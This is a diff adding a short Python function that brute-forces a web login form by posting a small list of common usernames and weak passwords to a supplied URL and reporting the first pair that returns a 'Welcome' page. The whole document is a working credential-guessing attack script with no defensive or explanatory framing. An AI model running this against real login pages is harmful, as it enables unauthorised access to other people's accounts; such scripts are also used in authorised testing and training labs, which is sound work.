@@ -1,0 +1,13 @@
+import requests
+
+def run(login_url):
+    usernames = ["admin", "user"]
+    passwords = ["1234", "password", "admin"]
+
+    for user in usernames:
+        for pwd in passwords:
+            response = requests.post(login_url, data={"username": user, "password": pwd})
+            if "Welcome" in response.text:
+                print(f"[+] Success: {user}:{pwd}")
+                return
+    print("[-] Brute force failed")
